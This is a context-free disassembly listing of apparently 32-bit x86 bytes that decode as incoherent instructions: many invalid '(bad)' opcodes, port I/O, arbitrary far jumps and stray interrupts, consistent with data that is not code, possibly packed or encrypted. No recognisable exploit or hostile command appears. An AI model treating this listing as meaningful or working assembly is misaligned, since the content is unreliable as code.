  41951a:	pop    edi
  41951b:	add    al,0x33
  41951d:	or     ebx,DWORD PTR [edi]
  41951f:	adc    eax,0x8e87f832
  419524:	fsub   DWORD PTR [ebp-0x6836e934]
  41952a:	xlat   BYTE PTR ds:[ebx]
  41952b:	ror    DWORD PTR [eax-0x29],cl
  41952e:	fs xchg ebx,eax
  419530:	das    
  419531:	ret    
  419532:	xor    BYTE PTR [esi+0x55],cl
  419535:	mov    ch,0x9c
  419537:	xchg   ebp,eax
  419538:	outs   dx,DWORD PTR ds:[esi]
  419539:	push   edi
  41953a:	mov    bl,0xc6
  41953c:	jle    0x4194e6
  41953e:	push   ebp
  41953f:	jl     0x4194ce
  419541:	fbld   TBYTE PTR [edi]
  419543:	dec    ecx
  419544:	add    BYTE PTR ds:0xfcd11b9,ah
  41954a:	jp     0x4194f5
  41954c:	cmp    BYTE PTR [esi+0x64],0x49
  419550:	jmp    0x29914ee4
  419555:	dec    esp
  419556:	jmp    0xa5e8f4a7
  41955b:	retf   
  41955c:	std    
  41955d:	enter  0x9330,0x86
  419561:	in     al,0xae
  419563:	dec    ecx
  419564:	ret    
  419565:	adc    al,BYTE PTR [ebx+0x73987e2]
  41956b:	lds    eax,FWORD PTR [edi+0x3e]
  41956e:	aam    0x1b
  419570:	popa   
  419571:	int    0xc9
  419573:	push   ds
  419574:	pop    esi
  419575:	int    0x8f
  419577:	or     eax,0x1e89eacc
  41957c:	lods   al,BYTE PTR ds:[esi]
  41957d:	xor    eax,0x41cbbd58
  419582:	call   0xbb0e:0x66d2e724
  419589:	aam    0xb9
  41958b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41958c:	push   esp
  41958d:	vpmullw ymm1,ymm5,ymm4
  419591:	cdq    
  419592:	mov    ds:0xb0569127,al
  419597:	jb     0x419585
  419599:	das    
  41959a:	call   0xcd29ff60
  41959f:	adc    DWORD PTR [ebp+0x58865c3c],ecx
  4195a5:	inc    eax
  4195a6:	sub    eax,0x78d50753
  4195ab:	(bad)  
  4195ac:	test   al,0x3f
  4195ae:	std    
  4195af:	loop   0x41958c
  4195b1:	stos   BYTE PTR es:[edi],al
  4195b2:	push   0x45c41418
  4195b7:	mov    ch,0x4c
  4195b9:	push   es
  4195ba:	pop    eax
  4195bb:	std    
  4195bc:	pushf  
  4195bd:	fldcw  WORD PTR [edi-0x36]
  4195c0:	mov    al,0xa3
  4195c2:	push   eax
  4195c3:	add    edx,DWORD PTR [ecx+0x59]
  4195c6:	jbe    0x41961b
  4195c8:	mov    ?,eax
  4195ca:	cmp    DWORD PTR ds:0xe4a42cbe,edi
  4195d0:	data16 sar BYTE PTR [ecx+ebp*4+0x3ad31d5f],1
  4195d8:	mov    ebx,0x1638fca
  4195dd:	in     eax,dx
  4195de:	jmp    0xdca7:0xd0c1854c
  4195e5:	mov    ds:0xc9daeb1,eax
  4195ea:	adc    al,0xa9
  4195ec:	and    DWORD PTR [ecx+0x4d],ecx
  4195ef:	sbb    edi,eax
  4195f1:	(bad)  
  4195f2:	sbb    DWORD PTR [eax+ebp*1-0x54c49bf0],eax
  4195f9:	(bad)  
  4195fa:	adc    eax,0x82c839e1
  4195ff:	jle    0x41961f
  419601:	outs   dx,BYTE PTR ds:[esi]
  419602:	push   esi
  419603:	icebp  
  419604:	cli    
  419605:	int    0xb4
  419607:	sbb    bl,BYTE PTR [ebx-0x2a]
  41960a:	push   ds
  41960b:	mov    esp,0xebd112e5
  419610:	call   0x443e:0x80836b4f
  419617:	pop    ebx
  419618:	xor    cl,ch
  41961a:	sub    al,0xf4
  41961c:	enter  0x2c20,0xe1
  419620:	stos   BYTE PTR es:[edi],al
  419621:	popf   
  419622:	repz or al,0xaf
  419625:	and    eax,edi
  419627:	push   es
  419628:	push   cs
  419629:	adc    ebx,DWORD PTR [edi]
  41962b:	sahf   
  41962c:	data16 adc ah,cl
  41962f:	lods   eax,DWORD PTR ds:[esi]
  419630:	adc    BYTE PTR [ebx+0x2003788e],cl
  419636:	popa   
  419637:	xchg   ebx,eax
  419638:	sub    al,0x28
  41963a:	push   es
  41963b:	xor    dl,BYTE PTR [esi+0xb093ac]
  419641:	iret   
  419642:	cmp    al,0xae
  419644:	push   edi
  419645:	or     eax,0x7703d753
  41964a:	sahf   
  41964b:	xor    ebp,DWORD PTR [eax]
  41964d:	retf   0x4438
  419650:	adc    al,0xb8
  419652:	ret    0x5908
  419655:	add    BYTE PTR [eax],dl
  419657:	push   esp
  419658:	jle    0x4196a6
  41965a:	adc    eax,0xd06baa98
  41965f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419660:	(bad)  
  419661:	dec    esp
  419662:	mov    esp,DWORD PTR ds:0x7ee5da60
  419668:	or     bl,ah
  41966a:	mov    cl,0x64
  41966d:	aas    
  41966e:	out    dx,eax
  41966f:	leavew 
  419671:	icebp  
  419672:	add    DWORD PTR [ebp-0x4e992fd6],ecx
  419678:	imul   esi,DWORD PTR [edx-0x28a86e54],0xffffffe8
  41967f:	jo     0x4196b9
  419681:	jmp    0x7b76:0xb95f33f0
  419688:	dec    BYTE PTR [ebx+0x33de59c5]
  41968e:	dec    edi
  41968f:	dec    ecx
  419690:	jno    0xe54fc9a7
  419696:	push   ss
  419697:	sub    DWORD PTR [ebp+0x506f0a46],edx
  41969d:	jne    0x419665
  41969f:	imul   edi,edi,0xfc01e456
  4196a5:	nop
  4196a6:	or     DWORD PTR [ebp+0x418c950a],0x5b
  4196ad:	push   esp
  4196ae:	mov    ah,0x73
  4196b0:	adc    eax,0xb98a5c2c
  4196b5:	sub    edi,DWORD PTR [esi+0x58dfb9ce]
  4196bb:	inc    ax
  4196bd:	das    
  4196be:	xrelease xchg BYTE PTR [edx+edi*4+0x77fc41db],bl
  4196c6:	stc    
  4196c7:	loopne 0x4196e8
  4196c9:	jnp    0x41972e
  4196cb:	push   eax
  4196cc:	repnz cdq 
  4196ce:	iret   
  4196cf:	mov    esi,0x19c1b3ec
  4196d4:	shl    BYTE PTR [edi+ebx*4],cl
  4196d7:	pop    edi
  4196d8:	sub    bl,BYTE PTR [ebx]
  4196da:	pusha  
  4196db:	aam    0x42
  4196dd:	popa   
  4196de:	mov    esp,0x50a256ce
  4196e3:	aaa    
  4196e4:	scas   eax,DWORD PTR es:[edi]
  4196e5:	fld    DWORD PTR [ebx+0x6a]
  4196e8:	push   0xffffffb7
  4196ea:	out    dx,al
  4196eb:	ror    BYTE PTR [ecx],1
  4196ed:	jg     0x419752
  4196ef:	call   0x7828:0x4730f290
  4196f6:	inc    ebp
  4196f7:	fsubr  st,st(1)
  4196f9:	dec    edx
  4196fa:	or     eax,0x81d4a7b7
  4196ff:	outs   dx,BYTE PTR ds:[esi]
  419700:	xor    al,0x7c
  419702:	push   0x4b
  419704:	mov    bh,0xd
  419706:	jae    0x4196ad
  419708:	(bad)  
  419709:	repz je 0x4196f0
  41970c:	int3   
  41970d:	add    al,0xb6
  41970f:	xor    eax,0xed047417
  419714:	or     eax,edx
  419716:	mov    dh,0x69
  419718:	jno    0x41975d
  41971a:	push   es
  41971b:	gs scas eax,DWORD PTR es:[edi]
  41971d:	xchg   edi,eax
  41971e:	or     ch,dh
  419720:	(bad)  
  419721:	jmp    0x91abac28
  419726:	cld    
  419727:	je     0x419795
  419729:	xor    bh,BYTE PTR [ebx]
  41972b:	xchg   DWORD PTR [edi],esp
  41972d:	pop    edx
  41972e:	mov    al,ds:0xda106369
  419733:	push   ss
  419734:	xchg   ebx,eax
  419735:	mov    eax,0x601d47cf
  41973a:	out    0x3f,eax
  41973c:	in     eax,dx
  41973d:	das    
  41973e:	sub    al,0xc8
  419740:	in     al,0xce
  419742:	lods   al,BYTE PTR ds:[esi]
  419743:	adc    eax,0x61ea0850
  419748:	add    DWORD PTR [ebx],ebx
  41974a:	int3   
  41974b:	mov    eax,0xffafaa1c
  419750:	mov    edi,0xdd4a9cc1
  419755:	xor    al,0xe0
  419757:	inc    ebp
  419758:	dec    ecx
  419759:	aaa    
  41975a:	jl     0x419742
  41975c:	mov    ds:0x4e5553f6,eax
  419761:	arpl   WORD PTR [ebp-0x45],di
  419764:	push   esp
  419765:	sub    DWORD PTR [edi+0x70],esp
  419768:	jge    0x419786
  41976a:	mov    ds:0xf00a0f93,eax
  41976f:	enter  0xf561,0xc1
  419773:	int    0xbd
  419775:	call   0x9822:0xf2fbe0c7
  41977c:	pop    eax
  41977d:	gs jns 0x419789
  419780:	xlat   BYTE PTR ds:[ebx]
  419781:	push   ss
  419782:	mov    esp,0x1ad4e885
  419787:	gs ffree st(2)
  41978a:	xchg   esi,eax
  41978b:	and    dh,BYTE PTR [esi+0x2572a877]
  419791:	clc    
  419792:	jle    0x4197ee
  419794:	jle    0x419788
  419796:	(bad)  
  419797:	jae    0x4197f9
  419799:	enter  0x5dc5,0xb8
  41979d:	ror    eax,0xf9
  4197a0:	call   FWORD PTR [eax+edx*4-0x64c91a6c]
  4197a7:	call   0xe1c4013a
  4197ac:	or     BYTE PTR [ebx+0x4ef9ba47],dh
  4197b2:	lods   al,BYTE PTR ds:[esi]
  4197b3:	push   eax
  4197b4:	je     0x4197fb
  4197b6:	push   0x3e58d6a5
  4197bb:	fwait
  4197bc:	cwde   
  4197bd:	pop    edx
  4197be:	inc    ecx
  4197bf:	cmp    DWORD PTR [ebp-0x40],0xb5c0c654
  4197c6:	dec    esi
  4197c7:	mov    al,ds:0x79e23258
  4197cc:	shl    ah,0xbb
  4197cf:	ficomp DWORD PTR [ecx]
  4197d1:	dec    ecx
  4197d2:	inc    ebx
  4197d3:	xchg   bh,bh
  4197d5:	int3   
  4197d6:	pop    edi
  4197d7:	jnp    0x4197b0
  4197d9:	or     ch,BYTE PTR [eax+eiz*4]
  4197dc:	idiv   DWORD PTR [edx]
  4197de:	ror    DWORD PTR [eax-0x20],1
  4197e1:	push   eax
  4197e2:	add    esi,DWORD PTR [ebx+0x2]
  4197e5:	sbb    BYTE PTR [ecx-0x4d83efc4],dh
  4197eb:	sahf   
  4197ec:	cmp    DWORD PTR [esi],edx
  4197ee:	leave  
  4197ef:	fdiv   st(5),st
  4197f1:	fs push ss
  4197f3:	jl     0x419797
  4197f5:	dec    edx
  4197f6:	inc    esp
  4197f7:	pop    esi
  4197f8:	dec    esi
  4197f9:	adc    al,0x57
  4197fb:	out    dx,eax
  4197fc:	loopne 0x4197de
  4197fe:	lock mov eax,ds:0xd26bd226
  419804:	xchg   ebp,eax
  419805:	aaa    
  419806:	addr16 iret 
  419808:	mov    edx,0x287e42b3
  41980d:	add    DWORD PTR [eax-0x70fa5172],0xffffff8a
  419814:	or     eax,0x235c8896
  419819:	inc    edx
  41981a:	out    0xde,al
  41981c:	sahf   
  41981d:	dec    ebx
  41981e:	dec    ebp
  41981f:	sub    ah,al
  419821:	and    ebx,DWORD PTR gs:[ebp-0x20e30c20]
  419828:	enter  0x1341,0x83
  41982c:	jb     0x4197d0
  41982e:	shl    DWORD PTR [ebp-0x74],0x7b
  419832:	adc    DWORD PTR [ecx],esi
  419834:	xor    cl,dl
  419836:	xchg   cl,cl
  419838:	cmp    bl,bl
  41983a:	stos   BYTE PTR es:[edi],al
  41983b:	xchg   edx,eax
  41983c:	inc    esi
  41983d:	and    bl,BYTE PTR [edx+edi*2-0x60d3f355]
  419844:	iret   
  419845:	add    al,0x18
  419847:	sti    
  419848:	sbb    BYTE PTR [eax-0x5d],dh
  41984b:	cmp    edx,esi
  41984d:	ret    0x2914
  419850:	adc    ebx,edi
  419852:	out    0xdd,eax
  419854:	add    BYTE PTR [edx],ch
  419856:	adc    BYTE PTR [edi],cl
  419858:	outs   dx,BYTE PTR ds:[esi]
  419859:	mov    eax,0xbd19b9c7
  41985e:	scas   al,BYTE PTR es:[edi]
  41985f:	arpl   WORD PTR [eax+0x2d],ax
  419862:	shl    DWORD PTR [edx+eiz*4+0x22],cl
  419866:	std    
  419867:	or     DWORD PTR [edx-0x9],0xffffffb3
  41986b:	push   cs
  41986c:	outs   dx,DWORD PTR ds:[esi]
  41986d:	ficomp WORD PTR [edx-0x18]
  419870:	test   BYTE PTR [edx],bl
  419872:	fs scas al,BYTE PTR es:[edi]
  419874:	aas    
  419875:	bound  ebp,QWORD PTR [esi]
  419877:	mov    ds:0x48b220ec,eax
  41987c:	push   esp
  41987d:	push   edi
  41987e:	test   BYTE PTR [ecx-0x146303c3],bl
  419884:	or     DWORD PTR [eax-0x282bfe2d],ebp
  41988a:	xchg   DWORD PTR [eax],ebp
  41988c:	adc    eax,0xb281490d
  419891:	add    al,0x9
  419893:	outs   dx,DWORD PTR ds:[esi]
  419894:	push   esp
  419895:	aad    0xa1
  419897:	int3   
  419898:	pushf  
  419899:	ins    BYTE PTR es:[edi],dx
  41989a:	pop    es
  41989b:	cmp    al,0x1b
  41989d:	dec    esi
  41989e:	or     eax,0x810a5cc3
  4198a3:	mov    ds:0xbf3a3a33,eax
  4198a8:	fcomp  QWORD PTR [edi]
  4198aa:	sub    al,0x56
  4198ac:	push   esp
  4198ad:	imul   esi,ecx,0x53
  4198b0:	jne    0x4198f1
  4198b2:	loope  0x41985c
  4198b4:	sub    al,0xe0
  4198b6:	cmp    DWORD PTR [ebx-0x7fc12ab7],ecx
  4198bc:	cdq    
  4198bd:	call   0xe5dda9e5
  4198c2:	xchg   DWORD PTR [ebp-0x1a],esp
  4198c5:	jle    0x419861
  4198c7:	push   ebx
  4198c8:	stos   DWORD PTR es:[edi],eax
  4198c9:	xor    al,0xc6
  4198cb:	sbb    ecx,esi
  4198cd:	push   ecx
  4198ce:	retf   0x3bbe
  4198d1:	dec    ecx
  4198d2:	scas   eax,DWORD PTR es:[edi]
  4198d3:	pop    ss
  4198d4:	data16 repz (bad) 
  4198d7:	xor    BYTE PTR cs:[ecx-0x2d],0xdf
  4198dc:	jnp    0x4198f5
  4198de:	loope  0x4198d7
  4198e0:	mov    dh,0xa7
  4198e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198e3:	ret    
  4198e4:	dec    ebx
  4198e5:	ror    BYTE PTR [esi+ebx*2],1
  4198e8:	sbb    ax,0x3ba8
  4198ec:	cld    
  4198ed:	sbb    DWORD PTR [esi+esi*4-0x164221ff],0x20110362
  4198f8:	ja     0x4198fd
  4198fa:	or     ebp,DWORD PTR [ecx-0x2f]
  4198fd:	and    DWORD PTR [ecx+0x3d239b9c],ebx
  419903:	xchg   DWORD PTR [edi],ecx
  419905:	jo     0x4198cc
  419907:	fist   WORD PTR [edx]
  419909:	mov    BYTE PTR [ebx],dl
  41990b:	sub    ch,cl
  41990d:	cmp    eax,0x48947d81
  419912:	pop    es
  419913:	mov    ah,0xf8
  419915:	add    eax,0x7180f9d9
  41991a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41991b:	call   0x4da629
  419920:	jle    0x4198ce
  419922:	xor    DWORD PTR [esi-0xb],0x32e8cc11
  419929:	xor    eax,0xa386b10
  41992e:	retf   0xdfff
  419931:	(bad)  
  419932:	int3   
  419933:	cmp    eax,0xb8837f00
  419938:	(bad)  
  419939:	aas    
  41993a:	ror    BYTE PTR [ecx+edi*8-0x4b],0x57
  41993f:	(bad)  [edx-0x76]
  419942:	imul   edx,DWORD PTR [edi],0xffffffee
  419945:	xlat   BYTE PTR ds:[ebx]
  419946:	mov    dl,BYTE PTR [bp+0x19]
  41994a:	cmp    bl,ah
  41994c:	xchg   ebx,eax
  41994d:	sub    eax,0x3c8cc0a9
  419952:	retf   0xfdb9
  419955:	ins    DWORD PTR es:[edi],dx
  419956:	cmp    edx,DWORD PTR [ebp+0x2e]
  419959:	jecxz  0x4198ec
  41995b:	mov    ah,cl
  41995d:	mov    ebx,0x21207bc
  419962:	pop    esp
  419963:	or     eax,0xa18fb7cb
  419968:	bound  ecx,QWORD PTR [edi+0x7f]
  41996b:	add    DWORD PTR [ecx+0x641de2c3],edi
  419971:	or     ebp,ebx
  419973:	ins    BYTE PTR es:[edi],dx
  419974:	sbb    ebx,0x59
  419977:	mov    BYTE PTR [esi-0x55978db5],cl
  41997d:	daa    
  41997e:	mov    dh,0x5
  419980:	bound  ebx,QWORD PTR [ebx+0xc660644]
  419986:	cmp    DWORD PTR [ebx+0x44f8100a],edx
  41998c:	mov    DWORD PTR [esi-0x73],eax
  41998f:	sub    esp,ebp
  419991:	aad    0xbc
  419993:	jecxz  0x4199d5
  419995:	arpl   WORD PTR [eax+esi*4+0x27],ax
  419999:	ins    DWORD PTR es:[edi],dx
  41999a:	in     al,0xcb
  41999c:	lahf   
  41999d:	das    
  41999e:	ja     0x419976
  4199a0:	inc    edi
  4199a1:	inc    edx
  4199a2:	clc    
  4199a3:	(bad)  
  4199a4:	jg     0x4199d0
  4199a6:	and    eax,0x2f09037
  4199ab:	cmp    dh,BYTE PTR [esi+esi*2+0x63]
  4199af:	pop    ebp
  4199b0:	lahf   
  4199b1:	je     0x4199fd
  4199b3:	cmp    esp,DWORD PTR ds:0x8e24f35b
  4199b9:	push   es
  4199ba:	aam    0xc6
  4199bc:	mov    ah,0xd3
  4199be:	push   esi
  4199bf:	mov    ch,0x3d
  4199c1:	mov    ds:0xeb85ba4f,eax
  4199c6:	xchg   ebx,eax
  4199c7:	js     0x419a20
  4199c9:	retf   0xd631
  4199cc:	sar    BYTE PTR [ebp-0x53],0xb1
  4199d0:	out    0xf3,eax
  4199d2:	sbb    BYTE PTR [edx],dl
  4199d4:	sti    
  4199d5:	jmp    0x419a33
  4199d7:	sbb    BYTE PTR ds:0x1728069d,dh
  4199dd:	mov    al,ds:0xbd59a954
  4199e2:	lock mov ds:0xd5997410,eax
  4199e8:	sbb    BYTE PTR [ebx],al
  4199ea:	call   0xd27e9f99
  4199ef:	pop    es
  4199f0:	popf   
  4199f1:	pop    edi
  4199f2:	stos   BYTE PTR es:[edi],al
  4199f3:	scas   al,BYTE PTR es:[edi]
  4199f4:	cmp    edx,DWORD PTR [esp+ebx*4+0x1fcfaff3]
  4199fb:	and    eax,0xe7a3c8c1
  419a00:	sub    edi,DWORD PTR [edx+0x3b]
  419a03:	push   ebp
  419a04:	xchg   ebx,eax
  419a05:	add    bl,dh
  419a07:	cmc    
  419a08:	sbb    al,0x3c
  419a0a:	or     bl,BYTE PTR [eax+0x6bfd4d85]
  419a10:	cmp    eax,0x58d94d66
  419a15:	fdivr  QWORD PTR [edi+eax*4+0x133a20e2]
  419a1c:	adc    al,0x48
  419a1e:	xchg   DWORD PTR [ebp+0x11],ebp
  419a21:	mov    ebx,fs
  419a23:	mov    edx,DWORD PTR [edx]
  419a25:	sub    BYTE PTR [esi],bh
  419a27:	test   eax,0x3e29304b
  419a2c:	pop    eax
  419a2d:	or     BYTE PTR [eax],ch
  419a2f:	push   0xf2ce19cc
  419a34:	in     al,0xcc
  419a36:	icebp  
  419a37:	out    0x83,eax
  419a39:	popa   
  419a3a:	mov    dl,0x25
  419a3c:	pop    ebx
  419a3d:	mov    dl,0xd5
  419a3f:	and    bl,BYTE PTR [ecx-0xf44467]
  419a45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a46:	(bad)  
  419a47:	jmp    DWORD PTR [eax]
  419a49:	cld    
  419a4a:	push   edi
  419a4b:	mov    cl,0x62
  419a4d:	(bad)  
  419a4e:	push   0xdd48e70a
  419a53:	jge    0x419a0a
  419a55:	gs mov dl,0xee
  419a58:	sahf   
  419a59:	ds out dx,eax
  419a5b:	xor    esp,DWORD PTR [ebx-0x6e]
  419a5e:	mov    esi,0xbf1118bd
  419a63:	mov    bh,0x7f
  419a65:	dec    edi
  419a66:	aam    0x89
  419a68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a69:	pop    es
  419a6a:	mov    ebp,0xea5f11e5
  419a6f:	add    DWORD PTR [edi+ebx*4],eax
  419a72:	retf   
  419a73:	outs   dx,DWORD PTR ds:[esi]
  419a74:	mov    ecx,0x836bb085
  419a79:	mov    ebp,0x238a9e23
  419a7e:	xchg   esi,eax
  419a7f:	push   ebp
  419a80:	scas   al,BYTE PTR es:[edi]
  419a81:	lods   al,BYTE PTR ds:[esi]
  419a82:	popf   
  419a83:	ss loope 0x419ade
  419a86:	dec    eax
  419a87:	mov    edi,edi
  419a89:	imul   edi,ebx,0xb08d14e1
  419a8f:	mov    ah,0x99
  419a91:	push   edi
  419a92:	push   edx
  419a93:	cmp    al,0x7c
  419a95:	mov    eax,0xfdfc79ff
  419a9a:	add    al,0x7c
  419a9c:	adc    ecx,edx
  419a9e:	stc    
  419a9f:	adc    DWORD PTR [esi+0x2274e8bc],esp
  419aa5:	xchg   BYTE PTR [edi+0x3ce3be13],bh
  419aab:	into   
  419aac:	pushf  
  419aad:	or     DWORD PTR [eax+0x37],esi
  419ab0:	jg     0x419a3d
  419ab2:	sub    DWORD PTR [ebp+0x75],edx
  419ab5:	mov    edx,0x72da4708
  419aba:	loopne 0x419a59
  419abc:	pop    ds
  419abd:	push   cs
  419abe:	and    al,0x56
  419ac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ac1:	mov    edx,DWORD PTR [ecx+0x11548b06]
  419ac7:	and    BYTE PTR [eax+0x73036a0c],bl
  419acd:	loopne 0x419ae1
  419acf:	sbb    BYTE PTR [ecx-0x79965014],ah
  419ad5:	(bad)  
  419ad7:	fnstenv [ebx+0x5f]
  419ada:	jle    0x419ad8
  419adc:	psrlw  mm4,QWORD PTR [ecx+eax*8+0x60]
  419ae1:	call   0x1c6808e3
  419ae6:	loop   0x419b0d
  419ae8:	xor    BYTE PTR [edi+edx*8+0x5d],cl
  419aec:	out    0x9e,eax
  419aee:	push   ecx
  419aef:	sub    ebp,esp
  419af1:	out    dx,eax
  419af2:	cmp    ecx,ebx
  419af4:	push   eax
  419af5:	jo     0x419a9f
  419af7:	adc    DWORD PTR [eax+0x4d751b1c],edx
  419afd:	sbb    cl,dh
  419aff:	inc    ebp
  419b00:	popf   
  419b01:	jle    0x419aa1
  419b03:	jb     0x419ad4
  419b05:	jb     0x419b0a
  419b07:	pop    edi
  419b08:	or     BYTE PTR [esi-0xc],cl
  419b0b:	sub    eax,0x3e17f056
  419b10:	mov    ah,0xd
  419b12:	ja     0x419b72
  419b14:	mul    DWORD PTR [ebx+0x614d360f]
  419b1a:	mov    al,0xaa
  419b1c:	xchg   esp,eax
  419b1d:	test   ecx,ebp
  419b1f:	fsubr  DWORD PTR [ecx-0x2d]
  419b22:	mov    ds:0x9345ce58,al
  419b27:	xchg   DWORD PTR fs:[ecx+0x5d],ebp
  419b2b:	xchg   esp,eax
  419b2c:	retf   
  419b2d:	in     al,dx
  419b2e:	adc    al,0x6a
  419b30:	fs mov bl,0x4a
  419b33:	adc    ecx,edx
  419b35:	(bad)  
  419b36:	jno    0x419b14
  419b38:	test   BYTE PTR [edi],al
  419b3a:	pop    ecx
  419b3b:	and    al,0x44
  419b3e:	test   al,dl
  419b40:	dec    ecx
  419b41:	in     eax,dx
  419b42:	inc    ecx
  419b43:	and    DWORD PTR [eax+0x13],0x6783401f
  419b4a:	bound  eax,QWORD PTR [ebp-0x700e915f]
  419b50:	add    BYTE PTR [ebp+0x58a99b8e],cl
  419b56:	out    dx,eax
  419b57:	ins    DWORD PTR es:[edi],dx
  419b58:	add    BYTE PTR [edi+ebx*8],ch
  419b5b:	mov    dl,0x5d
  419b5d:	add    al,0x51
  419b5f:	and    DWORD PTR [eax],0xffffffcf
  419b62:	jmp    0x2507:0xc9a948a0
  419b69:	outs   dx,BYTE PTR ds:[esi]
  419b6a:	inc    ebp
  419b6b:	cld    
  419b6c:	pop    ds
  419b6d:	fadd   DWORD PTR [esi+0x67]
  419b70:	popa   
  419b71:	cli    
  419b72:	cmp    DWORD PTR ds:0x86f8aec4,ebp
  419b78:	mov    al,0xcd
  419b7a:	jg     0x419b83
  419b7c:	jmp    0x96e80974
  419b81:	loope  0x419b14
  419b83:	cwde   
  419b84:	arpl   WORD PTR [ebx],sp
  419b86:	mov    bl,0xf5
  419b88:	or     BYTE PTR [ebp+0x5e],cl
  419b8b:	aas    
  419b8c:	ja     0x419b52
  419b8e:	icebp  
  419b8f:	aaa    
  419b90:	in     eax,0xb6
  419b92:	or     ebx,esi
  419b94:	lods   al,BYTE PTR ds:[esi]
  419b95:	mov    ds:0xd42e25a3,eax
  419b9a:	lods   al,BYTE PTR ds:[esi]
  419b9b:	jp     0x419bc6
  419b9d:	adc    BYTE PTR [eax],dl
  419b9f:	sub    DWORD PTR [eax-0x260a867],ebp
  419ba5:	data16 ja 0x419bcd
  419ba8:	mov    cs,WORD PTR [eax+0x39]
  419bab:	shl    DWORD PTR [eax+0x12a91f4d],1
  419bb1:	jle    0x419c01
  419bb3:	shl    BYTE PTR [ecx],cl
  419bb5:	mov    al,ds:0xae51cacc
  419bba:	xchg   DWORD PTR [edx+0x65],edi
  419bbd:	push   eax
  419bbe:	sub    al,0xfe
  419bc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bc1:	(bad)  ss:[eax+eiz*1-0x4ea89364]
  419bc9:	jle    0x419b5d
  419bcb:	inc    esi
  419bcc:	xchg   esp,eax
  419bcd:	stos   BYTE PTR es:[edi],al
  419bce:	push   cs
  419bcf:	out    0xca,al
  419bd1:	adc    ebp,0x60
  419bd4:	pop    esp
  419bd5:	loop   0x419c22
  419bd7:	lds    esi,FWORD PTR [ebx-0x23]
  419bda:	mov    ch,0x8a
  419bdc:	xchg   DWORD PTR [eax+0x20368b90],esp
  419be2:	dec    ecx
  419be3:	pop    esi
  419be4:	jo     0x419c1c
  419be6:	ins    BYTE PTR es:[edi],dx
  419be7:	fmulp  st(2),st
  419be9:	xchg   edx,eax
  419bea:	scas   al,BYTE PTR es:[edi]
  419beb:	jp     0x419c1e
  419bed:	mov    bh,0x4
  419bef:	mov    DWORD PTR [esi+0x77],esi
  419bf2:	xchg   esp,eax
  419bf3:	das    
  419bf4:	pushf  
  419bf5:	pop    esi
  419bf6:	sub    dh,BYTE PTR [ecx-0x12]
  419bf9:	fs cmp eax,0xccc5e027
  419bff:	xor    eax,ebx
  419c01:	xchg   esp,eax
  419c02:	xchg   edi,eax
  419c03:	inc    eax
  419c04:	mov    ebx,0x617ede80
  419c09:	and    DWORD PTR [edi+0x7b],0x348afb6a
  419c10:	sbb    ebx,edi
  419c12:	or     DWORD PTR [eax-0x4b],0x37
  419c16:	cmp    dh,BYTE PTR [ebx+0x3]
  419c19:	jmp    0x5ee2c365
  419c1e:	inc    ecx
  419c1f:	mov    ds:0x7604c388,eax
  419c24:	ret    0xe13b
  419c27:	ss adc al,0x0
  419c2a:	lds    esp,FWORD PTR [eax+0x12cf8a8c]
  419c30:	aam    0x25
  419c32:	inc    esi
  419c33:	sub    BYTE PTR [edi+0x1fdf5a95],ch
  419c39:	xor    DWORD PTR [eax+eiz*1+0x79],0xffffffcc
  419c3e:	stos   DWORD PTR es:[edi],eax
  419c3f:	out    0xe8,eax
  419c41:	push   esp
  419c42:	daa    
  419c43:	mov    bh,0xc3
  419c45:	out    0x83,eax
  419c47:	inc    esi
  419c48:	dec    edx
  419c49:	xchg   BYTE PTR [edi],dh
  419c4b:	ins    DWORD PTR es:[edi],dx
  419c4c:	(bad)  
  419c4e:	jb     0x419c47
  419c50:	mov    ebx,esp
  419c52:	cdq    
  419c53:	xchg   ecx,eax
  419c54:	vpmuludq xmm3,xmm5,XMMWORD PTR [ebx+eiz*4+0x5c]
  419c5a:	fadd   DWORD PTR [ebx-0xfe97e14]
  419c60:	pop    ss
  419c61:	xlat   BYTE PTR ds:[ebx]
  419c62:	jmp    0x419c97
  419c64:	dec    ebp
  419c65:	add    DWORD PTR [ebp+0x286a38fe],0xffffffed
  419c6c:	jg     0x419bf2
  419c6e:	pop    ds
  419c6f:	adc    ebp,DWORD PTR [ebp+0x62]
  419c72:	mov    eax,ds:0xd53854ba
  419c77:	clc    
  419c78:	(bad)  
  419c79:	pop    bx
  419c7b:	fild   WORD PTR [ebp-0x52542ba0]
  419c81:	fwait
  419c82:	icebp  
  419c83:	mov    dl,0xac
  419c85:	xor    DWORD PTR [esp+ecx*8],0xffffff92
  419c89:	xchg   BYTE PTR [esi],dl
  419c8b:	push   ebp
  419c8c:	xchg   BYTE PTR [edi+0x56],ah
  419c8f:	jbe    0x419cf1
  419c91:	repnz sbb ah,cl
  419c94:	sbb    BYTE PTR [edi+0x3f],bh
  419c97:	lahf   
  419c98:	jecxz  0x419c7c
  419c9a:	(bad)  [edi+esi*8]
  419c9d:	pop    esp
  419c9e:	gs jp  0x419d1e
  419ca1:	dec    ebp
  419ca2:	mov    DWORD PTR [edi-0x6e],0x6aad5799
  419ca9:	dec    edi
  419caa:	or     ch,BYTE PTR [ecx]
  419cac:	fild   QWORD PTR [esi]
  419cae:	fnstcw WORD PTR [edi]
  419cb0:	pushf  
  419cb1:	cmc    
  419cb2:	dec    edi
  419cb3:	jp     0x419c91
  419cb5:	cs stos DWORD PTR es:[edi],eax
  419cb7:	mov    ss:0x625c482c,eax
  419cbd:	and    eax,0x5239d2c9
  419cc2:	add    al,0x66
  419cc4:	outs   dx,DWORD PTR ds:[esi]
  419cc5:	or     ecx,DWORD PTR ds:0x79891ed
  419ccb:	rcl    DWORD PTR [eax],0xea
  419cce:	mov    esi,cs
  419cd0:	repnz daa 
  419cd2:	cwde   
  419cd3:	add    DWORD PTR fs:[ebx-0x945a0ad],ecx
  419cda:	or     BYTE PTR [ebp+0x2d2b28aa],al
  419ce0:	pushf  
  419ce1:	pop    ecx
  419ce2:	push   ds
  419ce3:	int    0x37
  419ce5:	scas   eax,DWORD PTR es:[edi]
  419ce6:	jnp    0x419cb8
  419ce8:	mov    ds:0x61019f24,eax
